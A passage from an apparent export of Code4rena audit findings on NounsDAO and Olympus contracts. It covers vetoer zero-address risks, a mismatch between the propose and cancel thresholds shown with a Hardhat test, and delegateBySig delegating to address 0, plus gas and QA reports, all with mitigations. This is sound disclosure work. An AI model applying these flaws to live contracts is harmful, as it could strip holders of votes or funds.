// pre delegation balances        let block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      const preBalance = await ve.balanceOfAt(bob.address, block); +      const preBalance = await ve.balanceOfAt(horse.address, block);        expect(preBalance).to.above(0);   -      // Bob extends lock -      await ve.connect(bob).increaseUnlockTime(lockTime); -      block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.above(preBalance); -    }); - -    it(\"Contract creates a lock, Bob delegates to contract\", async () => { -      const lockTime = 7 * WEEK + (await getTimestamp()); - -      // create lock -      await contract.createLock(ve.address, lockAmount, lockTime); -      let block = await getBlock(); -      expect(await ve.balanceOfAt(contract.address, block)).to.above(0); - -      // delegate to contract -      await ve.connect(bob).delegate(contract.address); -      block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.above(0); -      expect(await ve.balanceOfAt(contract.address, block)).to.above(0); -    }); - -    it(\"Alice re-delegates to contract\", async () => { -      let block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.above(0); - -      // re-delegation to contract -      await ve.connect(alice).delegate(contract.address); -      block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(contract.address, block)).to.above(0); -    }); - -    it(\"Alice's lock ends before Contract's, Alice cannot delegate back to herself\", async () => { -      tx = ve.connect(alice).delegate(alice.address); -      await expect(tx).to.be.revertedWith(\"Only delegate to longer lock\"); - -      const block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(contract.address, block)).to.above(0); -    }); - -    it(\"Alice extends her lock\", async () ="}, {"title": "Loss of Veto Power can Lead to 51% Attack", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/315", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643   # Vulnerability details  ## Impact The veto power is import functionality for current NounsDAO in order to protect their treasury from malicious proposals.  However there is lack of zero address check and lack of 2 step address changing process for vetoer address. This might lead to Nounders losing their veto power unintentionally and open to 51% attack which can drain their entire treasury.  Refrence from Nouns DAO contest documents: https://dialectic.ch/editorial/nouns-governance-attack https://dialectic.ch/editorial/nouns-governance-attack-2  ## Proof of Concept Lack of 0-address check for vetoer address at initialize() and _setVetoer() of NounsDAOLogicV2.sol and NounsDAOLogicV1.sol. Also it is better to make changing address process of vetoer at _setVetoer() into 2-step process to avoid accidently setting vetoer to zero address or any other arbitrary addresses and end up burning/losing veto power unintentionally.  1. vetoer address of initialize() of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L156 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L150  2. vetoer address of _setVetoer() of NounsDAOLogicV2.sol, NounsDAOLogicV1.sol https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV2.sol#L839-L845 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/governance/NounsDAOLogicV1.sol#L637-L643  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps Add zero address check for vetoer address at initialize(). Also change _setVetoer() vetoer address changing process to 2-step process like explained below.  First make the _setVetoer() function approve a new vetoer address as a pending vetoer. Next that pending vetoer has to claim the ownership in a separate transaction to be a new vetoer."}, {"title": "User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/255", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279 https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368   # Vulnerability details  ## Impact When User B calls the following `propose` function for creating a proposal, it checks that User B's prior number of votes at the relevant block is larger than the proposal threshold through executing `nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold`. This means that User B cannot create the proposal when the prior number of votes and the proposal threshold are the same.  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L184-L279 ```solidity     function propose(         address[] memory targets,         uint256[] memory values,         string[] memory signatures,         bytes[] memory calldatas,         string memory description     ) public returns (uint256) {         ProposalTemp memory temp;          temp.totalSupply = nouns.totalSupply();          temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);          require(             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,             'NounsDAO::propose: proposer votes below proposal threshold'         );         require(             targets.length == values.length &&                 targets.length == signatures.length &&                 targets.length == calldatas.length,             'NounsDAO::propose: proposal function information arity mismatch'         );         require(targets.length != 0, 'NounsDAO::propose: must provide actions');         require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');          temp.latestProposalId = latestProposalIds[msg.sender];         if (temp.latestProposalId != 0) {             ProposalState proposersLatestProposalState = state(temp.latestProposalId);             require(                 proposersLatestProposalState != ProposalState.Active,                 'NounsDAO::propose: one live proposal per proposer, found an already active proposal'             );             require(                 proposersLatestProposalState != ProposalState.Pending,                 'NounsDAO::propose: one live proposal per proposer, found an already pending proposal'             );         }          temp.startBlock = block.number + votingDelay;         temp.endBlock = temp.startBlock + votingPeriod;          proposalCount++;         Proposal storage newProposal = _proposals[proposalCount];         newProposal.id = proposalCount;         newProposal.proposer = msg.sender;         newProposal.proposalThreshold = temp.proposalThreshold;         newProposal.eta = 0;         newProposal.targets = targets;         newProposal.values = values;         newProposal.signatures = signatures;         newProposal.calldatas = calldatas;         newProposal.startBlock = temp.startBlock;         newProposal.endBlock = temp.endBlock;         newProposal.forVotes = 0;         newProposal.againstVotes = 0;         newProposal.abstainVotes = 0;         newProposal.canceled = false;         newProposal.executed = false;         newProposal.vetoed = false;         newProposal.totalSupply = temp.totalSupply;         newProposal.creationBlock = block.number;          latestProposalIds[newProposal.proposer] = newProposal.id;          /// @notice Maintains backwards compatibility with GovernorBravo events         emit ProposalCreated(             newProposal.id,             msg.sender,             targets,             values,             signatures,             calldatas,             newProposal.startBlock,             newProposal.endBlock,             description         );          /// @notice Updated event with `proposalThreshold` and `minQuorumVotes`         /// @notice `minQuorumVotes` is always zero since V2 introduces dynamic quorum with checkpoints         emit ProposalCreatedWithRequirements(             newProposal.id,             msg.sender,             targets,             values,             signatures,             calldatas,             newProposal.startBlock,             newProposal.endBlock,             newProposal.proposalThreshold,             minQuorumVotes(),             description         );          return newProposal.id;     } ```  After User B's proposal is created, User A can call the following `cancel` function to cancel it. When calling `cancel`, it checks that User B's prior number of votes at the relevant block is less than the proposal threshold through executing `nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold`. When User B's prior number of votes and the proposal threshold are the same, User A cannot cancel this proposal of User B. However, this contradicts the fact User B actually cannot create this proposal when the same condition holds true. In other words, if User B cannot create this proposal when the prior number of votes and the proposal threshold are the same, User A should be able to cancel User B's proposal under the same condition but it is not true. The functionality for canceling User B's proposal in this situation becomes unavailable for User A.  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L346-L368 ```solidity     function cancel(uint256 proposalId) external {         require(state(proposalId) != ProposalState.Executed, 'NounsDAO::cancel: cannot cancel executed proposal');          Proposal storage proposal = _proposals[proposalId];         require(             msg.sender == proposal.proposer ||                 nouns.getPriorVotes(proposal.proposer, block.number - 1) < proposal.proposalThreshold,             'NounsDAO::cancel: proposer above threshold'         );          proposal.canceled = true;         for (uint256 i = 0; i < proposal.targets.length; i++) {             timelock.cancelTransaction(                 proposal.targets[i],                 proposal.values[i],                 proposal.signatures[i],                 proposal.calldatas[i],                 proposal.eta             );         }          emit ProposalCanceled(proposalId);     } ```  ## Proof of Concept Please append the following test in the `NounsDAOV2#inflationHandling` `describe` block in `test\\governance\\NounsDAO\\V2\\inflationHandling.test.ts`. This test should pass to demonstrate the described scenario. ```typescript   it(\"User A cannot cancel User B's proposal when User B's prior number of votes at relevant block is same as proposal threshold, which contradicts the fact that User B actually cannot create the proposal when the prior number of votes is same as proposal threshold\",     async () => {     // account1 has 3 tokens at the beginning     // account1 gains 2 more to own 5 tokens in total     await token.transferFrom(deployer.address, account1.address, 11);     await token.transferFrom(deployer.address, account1.address, 12);      await mineBlock();      // account1 cannot create a proposal when owning 5 tokens in total     await expect(       gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing'),     ).to.be.revertedWith('NounsDAO::propose: proposer votes below proposal threshold');      // account1 gains 1 more to own 6 tokens in total     await token.transferFrom(deployer.address, account1.address, 13);      await mineBlock();      // account1 can create a proposal when owning 6 tokens in total     await gov.connect(account1).propose(targets, values, signatures, callDatas, 'do nothing');     const proposalId = await gov.latestProposalIds(account1.address);     expect(await gov.state(proposalId)).to.equal(0);      // other user cannot cancel account1's proposal at this moment     await expect(       gov.cancel(proposalId, {gasLimit: 1e6})     ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');          // account1 removes 1 token to own 5 tokens in total     await token.connect(account1).transferFrom(account1.address, deployer.address, 13);      await mineBlock();      // other user still cannot cancel account1's proposal when account1 owns 5 tokens in total     // this contradicts the fact that account1 cannot create a proposal when owning 5 tokens in total     await expect(       gov.cancel(proposalId, {gasLimit: 1e6})     ).to.be.revertedWith('NounsDAO::cancel: proposer above threshold');      // account1 removes another token to own 4 tokens in total     await token.connect(account1).transferFrom(account1.address, deployer.address, 12);      await mineBlock();      // other user can now cancel account1's proposal when account1 owns 4 tokens in total     await gov.cancel(proposalId, {gasLimit: 1e6})     expect(await gov.state(proposalId)).to.equal(2);   }); ```   ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L197-L200 can be changed to the following code. ```solidity         require(             nouns.getPriorVotes(msg.sender, block.number - 1) >= temp.proposalThreshold,             'NounsDAO::propose: proposer votes below proposal threshold'         ); ``` or  https://github.com/code-423n4/2022-08-nounsdao/blob/main/contracts/governance/NounsDAOLogicV2.sol#L350-L354 can be changed to the following code. ```solidity         require(             msg.sender == proposal.proposer ||                 nouns.getPriorVotes(proposal.proposer, block.number - 1) <= proposal.proposalThreshold,             'NounsDAO::cancel: proposer above threshold'         ); ```  but not both."}, {"title": "ERC721Checkpointable: delegateBySig allows the user to vote to address 0, which causes the user to permanently lose his vote and cannot transfer his NFT.", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/157", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-nounsdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L126-L144   # Vulnerability details  ## Impact In the ERC721Checkpointable contract, when the user votes with the delegate function, the delegatee will not be address 0. ```     function delegate(address delegatee) public {         if (delegatee == address(0)) delegatee = msg.sender;         return _delegate(msg.sender, delegatee);     } ``` However, there is no such restriction in the delegateBySig function, which allows the user to vote to address 0. ```     function delegateBySig(         address delegatee,         uint256 nonce,         uint256 expiry,         uint8 v,         bytes32 r,         bytes32 s     ) public {         bytes32 domainSeparator = keccak256(             abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this))         );         bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));         bytes32 digest = keccak256(abi.encodePacked('\\x19\\x01', domainSeparator, structHash));         address signatory = ecrecover(digest, v, r, s);         require(signatory != address(0), 'ERC721Checkpointable::delegateBySig: invalid signature');         require(nonce == nonces[signatory]++, 'ERC721Checkpointable::delegateBySig: invalid nonce');         require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');         return _delegate(signatory, delegatee);     } ``` If user A votes to address 0 in the delegateBySig function, _delegates[A] will be address 0, but the delegates function will return the address of user A and getCurrentVotes(A) will return 0. ```     function _delegate(address delegator, address delegatee) internal {         /// @notice differs from `_delegate()` in `Comp.sol` to use `delegates` override method to simulate auto-delegation         address currentDelegate = delegates(delegator);          _delegates[delegator] = delegatee; ...     function delegates(address delegator) public view returns (address) {         address current = _delegates[delegator];         return current == address(0) ? delegator : current;     } ``` Later, if user A votes to another address or transfers NFT, the _moveDelegates function will fail due to overflow, which makes user A lose votes forever and cannot transfer NFT. ```     function _moveDelegates(         address srcRep,         address dstRep,         uint96 amount     ) internal {         if (srcRep != dstRep && amount > 0) {             if (srcRep != address(0)) {                 uint32 srcRepNum = numCheckpoints[srcRep];                 uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;                 uint96 srcRepNew = sub96(srcRepOld, amount, 'ERC721Checkpointable::_moveDelegates: amount underflows'); // auditor : overflow here                 _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);             } ``` On the other hand, since the burn function also fails, this can also be used to prevent the NFT from being burned by the minter ```     function burn(uint256 nounId) public override onlyMinter {         _burn(nounId);         emit NounBurned(nounId);     } ...     function _burn(uint256 tokenId) internal virtual {         address owner = ERC721.ownerOf(tokenId);          _beforeTokenTransfer(owner, address(0), tokenId); ...     function _beforeTokenTransfer(         address from,         address to,         uint256 tokenId     ) internal override {         super._beforeTokenTransfer(from, to, tokenId);          /// @notice Differs from `_transferTokens()` to use `delegates` override method to simulate auto-delegation         _moveDelegates(delegates(from), delegates(to), 1);     } ``` ## Proof of Concept https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L126-L144 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L88-L91 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L97-L106 https://github.com/code-423n4/2022-08-nounsdao/blob/45411325ec14c6d747b999a40367d3c5109b5a89/contracts/base/ERC721Checkpointable.sol#L197-L208 ## Tools Used None ## Recommended Mitigation Steps Consider requiring in the delegateBySig function that delegatee cannot be address 0. ```diff     function delegateBySig(         address delegatee,         uint256 nonce,         uint256 expiry,         uint8 v,         bytes32 r,         bytes32 s     ) public { + require(delegatee != address(0)); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/501", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# [G-01] Prefix increment costs less gas than postfix increment  There are 7 instances of this issue.  ``` File: src/policies/Operator.sol 488: decimals++; 670: _status.low.count++; 675: _status.low.count--; 686: _status.high.count++; 691: _status.high.count--; ```  ``` File: src/utils/KernelUtils.sol 49: i++; 64: i++; ```  # [G-02] Cache the length of the array before the loop  There is 1 instance of this issue.  ``` File: src/policies/Governance.sol 278: for (uint256 step; step < instructions.length; ) { ```  # [G-03] Initializing a variable with the default value wastes gas  There are 3 instances of this issue.  ``` File: src/Kernel.sol 397: for (uint256 i = 0; i < reqLength; ) { ```  ``` File: src/utils/KernelUtils.sol 43: for (uint256 i = 0; i < 5; ) { 58: for (uint256 i = 0; i < 32; ) { ```  # [G-04] Use != 0 instead of > 0 to save gas.  Replace `> 0` with `!= 0` for unsigned integers.  On the instance bellow `userVotesForProposal` is a nested mapping of uints.  ``` File: src/policies/Governance.sol 247: if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { ```  # [G-05] Use right/left shift instead of division/multiplication to save gas  There are 5 instances of this issue.  ``` File: src/policies/Operator.sol 372: int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419: uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420: uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427: int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786: ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  # [G-06] Don\u2019t compare boolean expressions to boolean literals  There are 2 instances of this issue.  ``` File: src/policies/Governance.sol 223: if (proposalHasBeenActivated[proposalId_] == true) { 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  # [G-07] x += y costs more gas than x = x + y for state variables  There is 1 instance of this issue in `Price.sol` and 2 instances in `TRSRY.sol`  ``` File: src/modules/PRICE.sol 136: _movingAverage += (currentPrice - earliestPrice) / numObs; ```  ``` File: main/src/modules/TRSRY.sol 96: reserveDebt[token_][msg.sender] += amount_; 97: totalDebt[token_] += amount_; ```  # [G-08] Using private rather than public for constants, saves gas  The values can still be inspected on the source code if necessary.  There are 9 instances of this issue.  ``` File: src/modules/PRICE.sol 59: uint8 public constant decimals = 18; ```  ``` File: src/modules/RANGE.sol 65: uint256 public constant FACTOR_SCALE = 1e4; ```  ``` File: src/policies/Governance.sol 121: uint256 public constant SUBMISSION_REQUIREMENT = 100; 124: uint256 public constant ACTIVATION_DEADLINE = 2 weeks; 127: uint256 public constant GRACE_PERIOD = 1 weeks; 130: uint256 public constant ENDORSEMENT_THRESHOLD = 20; 133: uint256 public constant EXECUTION_THRESHOLD = 33; 137: uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ``` File: src/policies/Operator.sol 89: uint32 public constant FACTOR_SCALE = 1e4; ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/499", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# [L-01] Missing nonReentrant for function not using checks-effects-interactions  The `batchToTresury` function has access control, but it's updating the state after external calls. Consider adding a `nonReetrancy` modifier.  ``` File: src/policies/BondCallback.sol function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") {     ERC20 token;     uint256 balance;     uint256 len = tokens_.length;     for (uint256 i; i < len; ) {         token = tokens_[i];         balance = token.balanceOf(address(this));         token.safeTransfer(address(TRSRY), balance);         priorBalances[token] = token.balanceOf(address(this));          unchecked {             ++i;         }     } } ```  # [L-02] Missing zero address checks for setters  Consider adding checks against zero address when a function is receiving an input address.  ``` File: main/src/modules/TRSRY.sol 64: function setApprovalFor( 122: function setDebt( ```  # [NC-01] Non library files should use fixed compiler verion  Locking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version. Note that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.  There are 3 instances of this issue.  ``` File: src/interfaces/IBondCallback.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IHeart.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IOperator.sol 2: pragma solidity >=0.8.0; ```  # [NC-02] Public functions not called by the contract should be declared external  There are 2 instances of this issue  ``` File: src/policies/Governance.sol 151: function getActiveProposal() public view returns (ActivatedProposal memory) { 145: function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { ```  # [NC-03] Missing NATSPEC  Consider adding NATSPEC on all functions to enhance the project documentation.  ``` File: src/policies/Governance.sol 61: function configureDependencies() external override returns (Keycode[] memory dependencies) { 70: function requestPermissions() ```  # [NC-04] Lack of event when kernel grants or revoke status  Consider emitting an event when `setActiveStatus` is called to facilitate monitoring of the system.  ``` File: main/src/modules/TRSRY.sol 126: function setActiveStatus(bool activate_) external onlyKernel { ```  # [NC-05] TODOs should should be resolved before deployment  There are 4 instances of this issue.  ``` File: src/policies/Operator.sol 657: /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  ``` File: src/policies/TreasuryCustodian.sol 51: // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52: // TODO must reorg policy storage to be able to check for deactivated policies. 56: // TODO Make sure `policy_` is an actual policy and not a random address. ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/498", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " ## Summary  G-01 Using calldata instead of memory for read-only arguments in external functions saves gas (1 instance) G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables (12 instances) G-03 internal functions only called once can be inlined to save gas (2 instances) G-04 Using bools for storage incurs overhead (11 instances) G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement (1 instance0 G-06 ++i costs less gas than i++, especially when it\u2019s used in for-loops  (2 instances) G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead (88 instances) G-08 Using private rather than public for constants, saves gas (9 instances) G-09 Empty blocks should be removed or emit something (2 instances)  G-10 calldata instead of memory for read-only function parameter (5 instances)  Total: 133 instances in 10 issues   ## G-01 Using calldata instead of memory for read-only arguments in external functions saves gas When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  1 instance in 1 file: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162   ## G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables  12 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254   ## G-03 internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  2 instances in 2 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391-395  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L137-L141   ## G-04 Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false  11 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117   ## G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement  This change saves 6 gas per instance  1 instance in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247   ## G-06 ++i costs less gas than i++, especially when it\u2019s used in for-loops (--i/i-- too)  Saves 6 gas PER LOOP  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64   ## G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  88 instances in 10 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L27 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L28 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L51 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L52 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L54 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216 